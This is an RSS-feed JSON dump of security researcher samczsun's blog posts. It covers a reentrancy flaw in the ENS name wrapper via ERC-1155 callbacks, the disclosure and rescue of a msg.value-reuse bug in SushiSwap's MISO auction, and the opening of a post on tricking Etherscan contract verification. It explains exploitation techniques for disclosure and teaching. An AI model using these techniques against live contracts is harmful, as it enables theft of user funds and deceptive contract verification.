unwrap old token of old owner\n            _burn(uint256(node));\n            emit NameUnwrapped(node, address(0));\n        }\n        _mint(node, wrappedOwner, _fuses);\n    }\n    \n    function _mint(\n        bytes32 node,\n        address newOwner,\n        uint96 _fuses\n    ) internal virtual {\n        uint256 tokenId = uint256(node);\n        address owner = ownerOf(tokenId);\n        require(owner == address(0), \"ERC1155: mint of existing token\");\n        require(newOwner != address(0), \"ERC1155: mint to the zero address\");\n        require(\n            newOwner != address(this),\n            \"ERC1155: newOwner cannot be the NameWrapper contract\"\n        );\n        _setData(tokenId, newOwner, _fuses);\n        emit TransferSingle(msg.sender, address(0x0), newOwner, tokenId, 1);\n        _doSafeTransferAcceptanceCheck(\n            msg.sender,\n            address(0),\n            newOwner,\n            tokenId,\n            1,\n            \"\"\n        );\n    }\nBut what good does this do for us, exactly? Well, once again we are presented with an unsafe external call that we can use to perform reentrancy. Specifically, notice that during the callback we own the ERC-1155 token representing the ENS domain, but the name wrapper hasn't yet verified that we own the underlying ENS domain itself. This allows us to operate on the ENS domain without actually owning it in the first place. For example, we can ask the name wrapper to unwrap our domain, burning the token we just minted and getting the underlying ENS domain.\n    function unwrap(\n        bytes32 parentNode,\n        bytes32 label,\n        address newController\n    ) public override onlyTokenOwner(_makeNode(parentNode, label)) {\n        require(\n            parentNode != ETH_NODE,\n            \"NameWrapper: .eth names must be unwrapped with unwrapETH2LD()\"\n        );\n        _unwrap(_makeNode(parentNode, label), newController);\n    }\n    \n    function _unwrap(bytes32 node, address newOwner) private {\n        require(\n            newOwner != address(0x0),\n            \"NameWrapper: Target owner cannot be 0x0\"\n        );\n        require(\n            newOwner != address(this),\n            \"NameWrapper: Target owner cannot be the NameWrapper contract\"\n        );\n        require(\n            !allFusesBurned(node, CANNOT_UNWRAP),\n            \"NameWrapper: Domain is not unwrappable\"\n        );\n\n        // burn token and fuse data\n        _burn(uint256(node));\n        ens.setOwner(node, newOwner);\n\n        emit NameUnwrapped(node, newOwner);\n    }\nNow that we have the underlying ENS domain, we can do whatever we want with it, such as register new subdomains or set the resolver. When we're done, we just exit the callback. The name wrapper will fetch the current owner of the underlying ENS domain, which is us, and complete the transaction. Just like that, we've taken temporary ownership of any ENS domain the name wrapper is approved for and made arbitrary changes to it.\nConclusion\nCode that's surprising may break things in catastrophic ways. In both of these cases, developers who reasonably assumed that the safe class of functions would be (at least as) safe to use instead inadvertently increased their attack surface. As the ERC-721 and ERC-1155 standards become more popular and widespread, it is very likely that this will become an increasingly frequent occurrence. Developers will need to consider the risks of using the safe class of functions and determine how the external call might interact with the code they've written.","dc:creator":"samczsun","content":"The only thing worse than a bug in your code that breaks everything is a bug in your code that subtly breaks one thing","contentSnippet":"The only thing worse than a bug in your code that breaks everything is a bug in your code that subtly breaks one thing","guid":"6102f018532b7c00017e5f04","isoDate":"2021-08-13T19:52:42.000Z","from":"https://samczsun.com/rss/","hashId":"a49e56f087d550cc6650eee48c95ab37"},{"creator":"samczsun","title":"Two Rights Might Make A Wrong","link":"https://samczsun.com/two-rights-might-make-a-wrong/","pubDate":"Tue, 17 Aug 2021 19:41:02 GMT","content:encoded":"<img src=\"https://samczsun.com/content/images/2021/08/53083335_xl.jpg\" alt=\"Two Rights Might Make A Wrong\"><p>A common misconception in building software is that if every component in a system is individually verified to be safe, the system itself is also safe. Nowhere is this belief better illustrated than in DeFi, where composability is second nature to developers. Unfortunately, while composing two components might be safe most of the time, it only takes one vulnerability to cause serious financial damage to hundreds if not thousands of innocent users. Today, I&#x2019;d like to tell you about how I found and helped patch a vulnerability that put over 109k ETH (~350 million USD at today&#x2019;s exchange rate) at risk.</p><h1 id=\"the-encounter\">The Encounter</h1><p><em>9:42 AM</em></p><p>I was offhandedly browsing through the LobsterDAO group on Telegram when I noticed a discussion between <a href=\"https://twitter.com/ivangbi_\">@ivangbi_</a> and <a href=\"https://twitter.com/bantg\">@bantg</a> about a new raise on SushiSwap&#x2019;s MISO platform. I typically try to avoid drama in public, but I couldn&#x2019;t help but do a quick Google search to see what it was all about. The results I got back weren&#x2019;t particularly interesting to me, but I pressed onward, driven by a feeling there was something interesting to be found here if I just kept looking.</p><p>The MISO platform operates two types of auctions: Dutch auctions and batch auctions. In this case, the raise was being held with a Dutch auction. Naturally, the first thing I did was open up the contract on <a href=\"https://etherscan.io/address/0x4c4564a1FE775D97297F9e3Dc2e762e0Ed5Dda0e\">Etherscan</a>.</p><p><em>9:44 AM</em></p><p>I quickly skimmed through the DutchAuction contract per the participation agreement and checked each interesting function. The commit functions (<code>commitEth</code>, <code>commitTokens</code>, and <code>commitTokensFrom</code>) all seemed to be implemented correctly. The auction management functions (<code>setDocument</code>, <code>setList</code>, etc) also had the proper access controls. However, near the bottom I noticed that the <code>initMarket</code> function had no access controls, which was extremely concerning. Furthermore, the <code>initAuction</code> function it called also contained no access control checks.</p><p>I didn&#x2019;t really expect this to be a vulnerability though, since I didn&#x2019;t expect the Sushi team to make such an obvious misstep. Sure enough, the <code>initAccessControls</code> function validated that the contract had not already been initialized.</p><p>However, this led me to another discovery. While scrolling through all of the files, I noticed the <code>SafeTransfer</code> and <code>BoringBatchable</code> libraries. I was familiar with both of these, and I was immediately struck with the potential that the <code>BoringBatchable</code> library introduced.</p><p>For those who aren&#x2019;t familiar, <code>BoringBatchable</code> is a mixin library which is designed to easily introduce batch calls to any contract which imports it. It does this by performing a delegatecall on the current contract for each call data provided in the input.</p><pre><code class=\"language-solidity\">    function batch(bytes[] calldata calls, bool revertOnFail) external payable returns (bool[] memory successes, bytes[] memory results) {\n        successes = new bool[](calls.length);\n        results = new bytes[](calls.length);\n        for (uint256 i = 0; i &lt; calls.length; i++) {\n            (bool success, bytes memory result) = address(this).delegatecall(calls[i]);\n            require(success || !revertOnFail, _getRevertMsg(result));\n            successes[i] = success;\n            results[i] = result;\n        }\n    }\n</code></pre><p>Looking at this function, it appeared to be implemented correctly. However, something in the corner of my mind was nagging at me. That&#x2019;s when I realized I had seen something very similar in the past.</p><h1 id=\"the-discovery\">The Discovery</h1><p><em>9:47 AM</em></p><p>A little over a year ago today, I was in a Zoom call with the Opyn team, trying to figure out how to recover and protect user funds after a devastating hack. The hack itself was simple but genius: it exercised multiple options using a single payment of ETH because the Opyn contracts used the <code>msg.value</code> variable in a loop. While processing token payments involved a separate <code>transferFrom</code> call for each loop iteration, processing ETH payments simply checked whether <code>msg.value</code> was sufficient. This allowed the attacker to reuse the same ETH multiple times.</p><p>I realized that I was looking at the exact same vulnerability in a different form. Inside a delegatecall, <code>msg.sender</code> and <code>msg.value</code> are persisted. This meant that I should be able to batch multiple calls to <code>commitEth</code> and reuse my <code>msg.value</code> across every commitment, allowing me to bid in the auction for free.</p><p><em>9:52 AM</em></p><p>My instincts were telling me that this was the real deal, but I couldn&#x2019;t be sure without verifying it. I quickly opened up Remix and wrote a proof-of-concept. To my dismay, my mainnet fork environment was completely busted. I must&#x2019;ve accidentally broken it during the London hard fork. With how much money was at risk though, I didn&#x2019;t have the luxury of time. I quickly threw together a poor man&#x2019;s mainnet fork on the command line and tested my exploit. It worked.</p><p><em>10:13 AM</em></p><p>I pinged my colleague, <a href=\"https://twitter.com/gakonst\">Georgios Konstantopoulos</a>, to get a second pair of eyes on this before reporting it. While I waited for a response, I went back to the contract to look for ways to elevate the severity. It was one thing to be able to participate in the auction for free, but it would be another to be able to <em>steal</em> all of the other bids too.</p><p>I had noticed there was some refund logic during my initial scan but thought little of it. Now, it was a way to get ETH out of the contract. I quickly checked what conditions I would need to meet in order to get the contract to provide me with a refund.</p><p>To my surprise (and horror), I found that a refund would be issued for any ETH sent which went over the auction&#x2019;s hard cap. This applied even once the hard cap was hit, meaning that instead of rejecting the transaction altogether, the contract would simply refund all of your ETH instead.</p><p>Suddenly, my little vulnerability just got a lot bigger. I wasn&#x2019;t dealing with a bug that would let you outbid other participants. I was looking at a 350 million dollar bug.</p><h1 id=\"the-disclosure\">The Disclosure</h1><p><em>10:38 AM</em></p><p>After verifying the bug with Georgios, I asked him and <a href=\"https://twitter.com/danrobinson\">Dan Robinson</a> to try and reach out to Joseph Delong from Sushi. Within minutes, Joseph had responded and I found myself in a Zoom call with Georgios, Joseph, Mudit, Keno, and Omakase. I quickly debriefed the participants on the vulnerability and they left to coordinate a response. The entire call lasted mere minutes.</p><p><em>11:10 AM</em></p><p>Joseph got back to Georgios and I with a Google Meet room. I joined as Georgios was in the middle of debriefing Joseph, Mudit, Keno, and Omakase, as well as Duncan and Mitchell from Immunefi. We quickly discussed next steps.</p><p>We had three options:</p><ol><li>Leave the contract and hope no one notices</li><li>Rescue the funds using the exploit, probably using Flashbots to hide the transaction</li><li>Rescue the funds by purchasing the remaining allocation and immediately finalizing the auction, requiring admin permissions</li></ol><p>After some quick debate, we decided that option 3 was the cleanest approach. We broke out into separate rooms in order to work on comms and ops separately.</p><h1 id=\"the-preparation\">The Preparation</h1><p><em>11:26 AM</em></p><p>Inside the ops room, Mudit, Keno, Georgios, and I were busy writing a simple rescue contract. We decided that it would be cleanest to take a flash loan, purchase up to the hard cap, finalize the auction, then repay the flash loan using proceeds from the auction itself. This would require no upfront capital, which was very nice.</p><p><em>12:54 PM</em></p><p>We ran into a problem. What was originally supposed to be a simple rescue operation had just turned into a ticking time bomb that couldn&#x2019;t be defused, because there was <em>another</em> active auction. This was a batch auction, which meant that we couldn&#x2019;t just buy up to the hard cap because there was no hard cap at all. Fortunately, the lack of a hard cap also meant there was no way to drain ETH from the contract because no refunds were offered.</p><p>We quickly discussed the pros and cons of performing a whitehat rescue on the first contract and ultimately decided that even though the batch auction had 8 million USD committed, those 8 million USD weren&#x2019;t at risk, while the 350 million USD in the original Dutch auction was very much still at risk. Even if someone was tipped off by our forced halting of the Dutch auction and found the bug in the batch auction, we would still save the majority of the money. The call to proceed was made.</p><p><em>1:36 PM</em></p><p>As we wrapped up work on the rescue contract, we discussed next steps for the batch auction. Mudit pointed out that there was a points list which could be set even while the auction was live, and it was called during each ETH commitment. We immediately realized this could be the pause function we were looking for.</p><p>We brainstormed different ways to make use of this hook. Immediately reverting was an obvious solution, but we wanted something better. I considered adding a check that every origin could only make one commitment per block, but we noticed that the function was marked as view, which meant that the Solidity compiler would have used a static call opcode. Our hook wouldn&#x2019;t be allowed to make any state modifications.</p><p>After some more thinking, I realized that we could use the points list to verify that the auction contract had enough ETH to match the commitments being made. In other words, if someone tried to exploit this bug, then there would be more commitments than there was ETH. We could easily detect this and revert the transaction. Mudit and Keno began working on writing a test to verify.</p><h1 id=\"the-rescue\">The Rescue</h1><p><em>2:01 PM</em></p><p>The comms breakout team merged with the ops breakout team to sync on progress. They had made contact with the team performing the raise, but the team wanted to finalize the auction manually. We discussed the risks and agreed that there was minimal likelihood that an automated bot would notice the transaction or be able to do anything about it.</p><p><em>2:44 PM</em></p><p>The team performing the raise finalized the auction, neutralizing the immediate threat. We congratulated each other and went our separate ways. The batch auction would finalize later in the day to little fanfare. No one outside of the circle of trust knew what scale of crisis had just been averted.</p><h1 id=\"the-reflection\">The Reflection</h1><p><em>4:03 PM</em></p><p>The past few hours feel like a blur, almost as though no time has passed at all. I had gone from encounter to discovery in a little over half an hour, disclosure in 20 minutes, war room in another 30, and a fix in three hours. All in all, it took only five hours to protect 350 million USD from falling into the wrong hands.</p><p>Even though there was no monetary damage, I&#x2019;m sure that everyone involved would have much preferred to not have gone through this process in the first place. To that end, I have two main takeaways for you.</p><p>First, using <code>msg.value</code> in complex systems is hard. It&#x2019;s a global variable that you can&#x2019;t change and persists across delegate calls. If you use <code>msg.value</code> to check that payment was received, you absolutely cannot place that logic in a loop. As a codebase grows in complexity, it&#x2019;s easy to lose track of where that happens and accidentally loop something in the wrong place. Although wrapping and unwrapping of ETH is annoying and introduces extra steps, the unified interface between WETH and other ERC20 tokens might be well worth the cost if it means avoiding something like this.</p><p>Second, safe components can come together to make something unsafe. I&#x2019;ve preached this before in the context of composability and DeFi protocols, but this incident shows that even safe contract-level components can be mixed in a way that produces unsafe contract-level behavior. There&#x2019;s no catch-all advice to apply here like &#x201C;check-effect-interaction,&#x201D; so you just need to be cognizant of what additional interactions new components are introducing.</p><p>I&#x2019;d like to thank Sushi contributors, Joseph, Mudit, Keno, and Omakase for their extremely quick response to this issue as well as my colleagues Georgios, Dan, and Jim for their help throughout this process, including reviewing this post.</p>","content:encodedSnippet":"A common misconception in building software is that if every component in a system is individually verified to be safe, the system itself is also safe. Nowhere is this belief better illustrated than in DeFi, where composability is second nature to developers. Unfortunately, while composing two components might be safe most of the time, it only takes one vulnerability to cause serious financial damage to hundreds if not thousands of innocent users. Today, I’d like to tell you about how I found and helped patch a vulnerability that put over 109k ETH (~350 million USD at today’s exchange rate) at risk.\nThe Encounter\n9:42 AM\nI was offhandedly browsing through the LobsterDAO group on Telegram when I noticed a discussion between @ivangbi_ and @bantg about a new raise on SushiSwap’s MISO platform. I typically try to avoid drama in public, but I couldn’t help but do a quick Google search to see what it was all about. The results I got back weren’t particularly interesting to me, but I pressed onward, driven by a feeling there was something interesting to be found here if I just kept looking.\nThe MISO platform operates two types of auctions: Dutch auctions and batch auctions. In this case, the raise was being held with a Dutch auction. Naturally, the first thing I did was open up the contract on Etherscan.\n9:44 AM\nI quickly skimmed through the DutchAuction contract per the participation agreement and checked each interesting function. The commit functions (commitEth, commitTokens, and commitTokensFrom) all seemed to be implemented correctly. The auction management functions (setDocument, setList, etc) also had the proper access controls. However, near the bottom I noticed that the initMarket function had no access controls, which was extremely concerning. Furthermore, the initAuction function it called also contained no access control checks.\nI didn’t really expect this to be a vulnerability though, since I didn’t expect the Sushi team to make such an obvious misstep. Sure enough, the initAccessControls function validated that the contract had not already been initialized.\nHowever, this led me to another discovery. While scrolling through all of the files, I noticed the SafeTransfer and BoringBatchable libraries. I was familiar with both of these, and I was immediately struck with the potential that the BoringBatchable library introduced.\nFor those who aren’t familiar, BoringBatchable is a mixin library which is designed to easily introduce batch calls to any contract which imports it. It does this by performing a delegatecall on the current contract for each call data provided in the input.\n    function batch(bytes[] calldata calls, bool revertOnFail) external payable returns (bool[] memory successes, bytes[] memory results) {\n        successes = new bool[](calls.length);\n        results = new bytes[](calls.length);\n        for (uint256 i = 0; i < calls.length; i++) {\n            (bool success, bytes memory result) = address(this).delegatecall(calls[i]);\n            require(success || !revertOnFail, _getRevertMsg(result));\n            successes[i] = success;\n            results[i] = result;\n        }\n    }\n\nLooking at this function, it appeared to be implemented correctly. However, something in the corner of my mind was nagging at me. That’s when I realized I had seen something very similar in the past.\nThe Discovery\n9:47 AM\nA little over a year ago today, I was in a Zoom call with the Opyn team, trying to figure out how to recover and protect user funds after a devastating hack. The hack itself was simple but genius: it exercised multiple options using a single payment of ETH because the Opyn contracts used the msg.value variable in a loop. While processing token payments involved a separate transferFrom call for each loop iteration, processing ETH payments simply checked whether msg.value was sufficient. This allowed the attacker to reuse the same ETH multiple times.\nI realized that I was looking at the exact same vulnerability in a different form. Inside a delegatecall, msg.sender and msg.value are persisted. This meant that I should be able to batch multiple calls to commitEth and reuse my msg.value across every commitment, allowing me to bid in the auction for free.\n9:52 AM\nMy instincts were telling me that this was the real deal, but I couldn’t be sure without verifying it. I quickly opened up Remix and wrote a proof-of-concept. To my dismay, my mainnet fork environment was completely busted. I must’ve accidentally broken it during the London hard fork. With how much money was at risk though, I didn’t have the luxury of time. I quickly threw together a poor man’s mainnet fork on the command line and tested my exploit. It worked.\n10:13 AM\nI pinged my colleague, Georgios Konstantopoulos, to get a second pair of eyes on this before reporting it. While I waited for a response, I went back to the contract to look for ways to elevate the severity. It was one thing to be able to participate in the auction for free, but it would be another to be able to steal all of the other bids too.\nI had noticed there was some refund logic during my initial scan but thought little of it. Now, it was a way to get ETH out of the contract. I quickly checked what conditions I would need to meet in order to get the contract to provide me with a refund.\nTo my surprise (and horror), I found that a refund would be issued for any ETH sent which went over the auction’s hard cap. This applied even once the hard cap was hit, meaning that instead of rejecting the transaction altogether, the contract would simply refund all of your ETH instead.\nSuddenly, my little vulnerability just got a lot bigger. I wasn’t dealing with a bug that would let you outbid other participants. I was looking at a 350 million dollar bug.\nThe Disclosure\n10:38 AM\nAfter verifying the bug with Georgios, I asked him and Dan Robinson to try and reach out to Joseph Delong from Sushi. Within minutes, Joseph had responded and I found myself in a Zoom call with Georgios, Joseph, Mudit, Keno, and Omakase. I quickly debriefed the participants on the vulnerability and they left to coordinate a response. The entire call lasted mere minutes.\n11:10 AM\nJoseph got back to Georgios and I with a Google Meet room. I joined as Georgios was in the middle of debriefing Joseph, Mudit, Keno, and Omakase, as well as Duncan and Mitchell from Immunefi. We quickly discussed next steps.\nWe had three options:\n\nLeave the contract and hope no one notices\nRescue the funds using the exploit, probably using Flashbots to hide the transaction\nRescue the funds by purchasing the remaining allocation and immediately finalizing the auction, requiring admin permissions\n\nAfter some quick debate, we decided that option 3 was the cleanest approach. We broke out into separate rooms in order to work on comms and ops separately.\nThe Preparation\n11:26 AM\nInside the ops room, Mudit, Keno, Georgios, and I were busy writing a simple rescue contract. We decided that it would be cleanest to take a flash loan, purchase up to the hard cap, finalize the auction, then repay the flash loan using proceeds from the auction itself. This would require no upfront capital, which was very nice.\n12:54 PM\nWe ran into a problem. What was originally supposed to be a simple rescue operation had just turned into a ticking time bomb that couldn’t be defused, because there was another active auction. This was a batch auction, which meant that we couldn’t just buy up to the hard cap because there was no hard cap at all. Fortunately, the lack of a hard cap also meant there was no way to drain ETH from the contract because no refunds were offered.\nWe quickly discussed the pros and cons of performing a whitehat rescue on the first contract and ultimately decided that even though the batch auction had 8 million USD committed, those 8 million USD weren’t at risk, while the 350 million USD in the original Dutch auction was very much still at risk. Even if someone was tipped off by our forced halting of the Dutch auction and found the bug in the batch auction, we would still save the majority of the money. The call to proceed was made.\n1:36 PM\nAs we wrapped up work on the rescue contract, we discussed next steps for the batch auction. Mudit pointed out that there was a points list which could be set even while the auction was live, and it was called during each ETH commitment. We immediately realized this could be the pause function we were looking for.\nWe brainstormed different ways to make use of this hook. Immediately reverting was an obvious solution, but we wanted something better. I considered adding a check that every origin could only make one commitment per block, but we noticed that the function was marked as view, which meant that the Solidity compiler would have used a static call opcode. Our hook wouldn’t be allowed to make any state modifications.\nAfter some more thinking, I realized that we could use the points list to verify that the auction contract had enough ETH to match the commitments being made. In other words, if someone tried to exploit this bug, then there would be more commitments than there was ETH. We could easily detect this and revert the transaction. Mudit and Keno began working on writing a test to verify.\nThe Rescue\n2:01 PM\nThe comms breakout team merged with the ops breakout team to sync on progress. They had made contact with the team performing the raise, but the team wanted to finalize the auction manually. We discussed the risks and agreed that there was minimal likelihood that an automated bot would notice the transaction or be able to do anything about it.\n2:44 PM\nThe team performing the raise finalized the auction, neutralizing the immediate threat. We congratulated each other and went our separate ways. The batch auction would finalize later in the day to little fanfare. No one outside of the circle of trust knew what scale of crisis had just been averted.\nThe Reflection\n4:03 PM\nThe past few hours feel like a blur, almost as though no time has passed at all. I had gone from encounter to discovery in a little over half an hour, disclosure in 20 minutes, war room in another 30, and a fix in three hours. All in all, it took only five hours to protect 350 million USD from falling into the wrong hands.\nEven though there was no monetary damage, I’m sure that everyone involved would have much preferred to not have gone through this process in the first place. To that end, I have two main takeaways for you.\nFirst, using msg.value in complex systems is hard. It’s a global variable that you can’t change and persists across delegate calls. If you use msg.value to check that payment was received, you absolutely cannot place that logic in a loop. As a codebase grows in complexity, it’s easy to lose track of where that happens and accidentally loop something in the wrong place. Although wrapping and unwrapping of ETH is annoying and introduces extra steps, the unified interface between WETH and other ERC20 tokens might be well worth the cost if it means avoiding something like this.\nSecond, safe components can come together to make something unsafe. I’ve preached this before in the context of composability and DeFi protocols, but this incident shows that even safe contract-level components can be mixed in a way that produces unsafe contract-level behavior. There’s no catch-all advice to apply here like “check-effect-interaction,” so you just need to be cognizant of what additional interactions new components are introducing.\nI’d like to thank Sushi contributors, Joseph, Mudit, Keno, and Omakase for their extremely quick response to this issue as well as my colleagues Georgios, Dan, and Jim for their help throughout this process, including reviewing this post.","dc:creator":"samczsun","content":"Too much raw fish doesn’t make a better roll of sushi","contentSnippet":"Too much raw fish doesn’t make a better roll of sushi","guid":"611c07f27c20580001fdeb0f","isoDate":"2021-08-17T19:41:02.000Z","from":"https://samczsun.com/rss/","hashId":"4714220b0cf46e210827e8363513aff2"},{"creator":"samczsun","title":"Hiding in Plain Sight","link":"https://samczsun.com/hiding-in-plain-sight/","pubDate":"Thu, 11 Nov 2021 14:19:31 GMT","content:encoded":"<img src=\"https://samczsun.com/content/images/2021/11/161381622_xl.jpg\" alt=\"Hiding in Plain Sight\"><p>I like challenging assumptions.</p><p>I like trying to do the impossible, finding what others have missed, and blowing people&apos;s minds with things they never saw coming. Last year, I wrote a <a href=\"https://samczsun.com/paradigm-ctf-2021-swap/\">challenge</a> for Paradigm CTF 2021 based on a very obscure Solidity bug. While one variation had been publicly disclosed, the vulnerability I exploited had never really been discussed. As a result, almost everyone who tried the challenge was stumped by the seemingly impossible nature of it.</p><p>A few weeks ago, we were discussing plans around Paradigm CTF 2022 when Georgios tweeted out a teaser tweet. I thought it would be incredibly cool to drop a teaser challenge on the same day as the kickoff call. However, it couldn&apos;t just be any old teaser challenge. I wanted something out of this world, something that no one would see coming, something that pushed the limits of what people could even imagine. I wanted to write the first Ethereum CTF challenge that exploited an 0day.</p><figure class=\"kg-card kg-embed-card\"><blockquote class=\"twitter-tweet\"><p lang=\"und\" dir=\"ltr\">&#x1F7E9; &#x1F3C1; <a href=\"https://twitter.com/paradigm_ctf?ref_src=twsrc%5Etfw\">@paradigm_ctf</a> &#x1F440;&#x1F440;&#x1F440; <br><br>w/ <a href=\"https://twitter.com/samczsun?ref_src=twsrc%5Etfw\">@samczsun</a> <a href=\"https://twitter.com/TylerCrimm?ref_src=twsrc%5Etfw\">@TylerCrimm</a> <a href=\"https://twitter.com/AmanGotchu?ref_src=twsrc%5Etfw\">@AmanGotchu</a> <a href=\"https://twitter.com/williamLberman?ref_src=twsrc%5Etfw\">@williamLberman</a> <a href=\"https://t.co/QCMCYBHNbs\">pic.twitter.com/QCMCYBHNbs</a></p>&#x2014; Georgios Konstantopoulos (@gakonst) <a href=\"https://twitter.com/gakonst/status/1447973894887985158?ref_src=twsrc%5Etfw\">October 12, 2021</a></blockquote>\n<script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n</figure><h1 id=\"how-its-made-0days\">How It&apos;s Made: 0days</h1><p>As security researchers, there are a few base assumptions we make in order to optimize our time. One is that the source code we&apos;re reading really did produce the contract we&apos;re analyzing. Of course, this assumption only holds if we&apos;re reading the source code from somewhere trusted, like Etherscan. Therefore, if I could figure out a way to have Etherscan verify something incorrectly, I would be able to design a really devious puzzle around it.</p><p>In order to figure out how to exploit Etherscan&apos;s contract verification system, I had to verify some contracts. I deployed a few contracts to Ropsten to play around with and tried verifying them. Immediately, I was greeted with the following screen.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/10/image.png\" class=\"kg-image\" alt=\"Hiding in Plain Sight\" loading=\"lazy\" width=\"1194\" height=\"633\" srcset=\"https://samczsun.com/content/images/size/w600/2021/10/image.png 600w, https://samczsun.com/content/images/size/w1000/2021/10/image.png 1000w, https://samczsun.com/content/images/2021/10/image.png 1194w\" sizes=\"(min-width: 720px) 720px\"></figure><p>I selected the correct settings and moved onto the next screen. Here, I was asked to provide my contract source code.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/10/image-3.png\" class=\"kg-image\" alt=\"Hiding in Plain Sight\" loading=\"lazy\" width=\"1354\" height=\"827\" srcset=\"https://samczsun.com/content/images/size/w600/2021/10/image-3.png 600w, https://samczsun.com/content/images/size/w1000/2021/10/image-3.png 1000w, https://samczsun.com/content/images/2021/10/image-3.png 1354w\" sizes=\"(min-width: 720px) 720px\"></figure><p>I put in the source code and clicked verify. Sure enough, my source code was now attached to my contract.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/10/image-2.png\" class=\"kg-image\" alt=\"Hiding in Plain Sight\" loading=\"lazy\" width=\"1362\" height=\"440\" srcset=\"https://samczsun.com/content/images/size/w600/2021/10/image-2.png 600w, https://samczsun.com/content/images/size/w1000/2021/10/image-2.png 1000w, https://samczsun.com/content/images/2021/10/image-2.png 1362w\" sizes=\"(min-width: 720px) 720px\"></figure><p>Now that I knew how things worked, I could start playing around with the verification process. The first thing I tried was deploying a new contract with <code>foo</code> changed to <code>bar</code> and verifying that contract with the original source code. Unsurprisingly, Etherscan refused to verify my contract.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/10/image-4.png\" class=\"kg-image\" alt=\"Hiding in Plain Sight\" loading=\"lazy\" width=\"1383\" height=\"912\" srcset=\"https://samczsun.com/content/images/size/w600/2021/10/image-4.png 600w, https://samczsun.com/content/images/size/w1000/2021/10/image-4.png 1000w, https://samczsun.com/content/images/2021/10/image-4.png 1383w\" sizes=\"(min-width: 720px) 720px\"></figure><p>However, when I manually compared the two bytecode outputs, I noticed something strange. Contract bytecode is supposed to be hex, but there was clearly some non-hex in there.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/10/image-5.png\" class=\"kg-image\" alt=\"Hiding in Plain Sight\" loading=\"lazy\" width=\"1868\" height=\"981\" srcset=\"https://samczsun.com/content/images/size/w600/2021/10/image-5.png 600w, https://samczsun.com/content/images/size/w1000/2021/10/image-5.png 1000w, https://samczsun.com/content/images/size/w1600/2021/10/image-5.png 1600w, https://samczsun.com/content/images/2021/10/image-5.png 1868w\" sizes=\"(min-width: 720px) 720px\"></figure><p>I knew that Solidity appended <a href=\"https://docs.soliditylang.org/en/v0.8.9/metadata.html#encoding-of-the-metadata-hash-in-the-bytecode\">contract metadata</a> to the deployed bytecode, but I never really considered how it affects contract verification. Clearly, Etherscan was scanning through the bytecode for the metadata and then replacing it with a marker that said, &quot;Anything in this region is allowed to be different, and we&apos;ll still consider it the same bytecode.&quot;</p><p>This seemed like a promising lead for a potential 0day. If I could trick Etherscan into interpreting non-metadata as metadata, then I would be able to tweak my deployed bytecode in the region marked <code>{ipfs}</code> while still having it verify as the legitimate bytecode.</p><p>The easiest way I could think of to include some arbitrary bytecode in the creation transaction was to encode them as constructor arguments. Solidity encodes constructor arguments by appending their ABI-encoded forms directly onto the create transaction data.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/10/image-6.png\" class=\"kg-image\" alt=\"Hiding in Plain Sight\" loading=\"lazy\" width=\"1353\" height=\"621\" srcset=\"https://samczsun.com/content/images/size/w600/2021/10/image-6.png 600w, https://samczsun.com/content/images/size/w1000/2021/10/image-6.png 1000w, https://samczsun.com/content/images/2021/10/image-6.png 1353w\" sizes=\"(min-width: 720px) 720px\"></figure><p>However, Etherscan was too smart, and excluded the constructor arguments from any sort of metadata sniffing. You can see that the constructor arguments are italicized, to indicate that they&apos;re separate from the code itself.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/10/image-7.png\" class=\"kg-image\" alt=\"Hiding in Plain Sight\" loading=\"lazy\" width=\"1324\" height=\"203\" srcset=\"https://samczsun.com/content/images/size/w600/2021/10/image-7.png 600w, https://samczsun.com/content/images/size/w1000/2021/10/image-7.png 1000w, https://samczsun.com/content/images/2021/10/image-7.png 1324w\" sizes=\"(min-width: 720px) 720px\"></figure><p>This meant I would need to somehow trick the Solidity compiler into emitting a sequence of bytes that I controlled, so I could make it resemble the embedded metadata. However, this seemed like a nightmare of a problem to solve, since I would have almost no control over the opcodes or bytes that Solidity chooses to use without some serious compiler wrangling, after which the source code would look extremely suspicious.</p><p>I considered this problem for a while, until it hit me: it was actually extremely easy to cause Solidity to emit (almost) arbitrary bytes. The following code will cause Solidity to emit 32 bytes of <code>0xAA</code>.</p><pre><code class=\"language-solidity\">bytes32 value = 0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;</code></pre><p>Motivated, I quickly wrote a small contract which would push a series of constants in such a way that Solidity would emit bytecode which exactly resembled the embedded metadata.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/10/image-9.png\" class=\"kg-image\" alt=\"Hiding in Plain Sight\" loading=\"lazy\" width=\"1354\" height=\"390\" srcset=\"https://samczsun.com/content/images/size/w600/2021/10/image-9.png 600w, https://samczsun.com/content/images/size/w1000/2021/10/image-9.png 1000w, https://samczsun.com/content/images/2021/10/image-9.png 1354w\" sizes=\"(min-width: 720px) 720px\"></figure><p>To my delight, Etherscan marked the presence of an IPFS hash in the middle of my contract, where no embedded metadata should ever be found.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/10/image-10.png\" class=\"kg-image\" alt=\"Hiding in Plain Sight\" loading=\"lazy\" width=\"1322\" height=\"206\" srcset=\"https://samczsun.com/content/images/size/w600/2021/10/image-10.png 600w, https://samczsun.com/content/images/size/w1000/2021/10/image-10.png 1000w, https://samczsun.com/content/images/2021/10/image-10.png 1322w\" sizes=\"(min-width: 720px) 720px\"></figure><p>I quickly copied the expected bytecode and replaced the IPFS hash with some random bytes, then deployed the resulting contract. Sure enough, Etherscan considered the differing bytes business as usual, and allowed my contract to be verified.</p><figure class=\"kg-card kg-image-card\"><img src=\"https://samczsun.com/content/images/2021/10/image-11.png\" class=\"kg-image\" alt=\"Hiding in Plain Sight\" loading=\"lazy\" width=\"1354\" height=\"420\" srcset=\"https://samczsun.com/content/images/size/w600/2021/10/image-11.png 600w, https://samczsun.com/content/images/size/w1000/2021/10/image-11.png 1000w, https://samczsun.com/content/images/2021/10/image-11.png 1354w\" 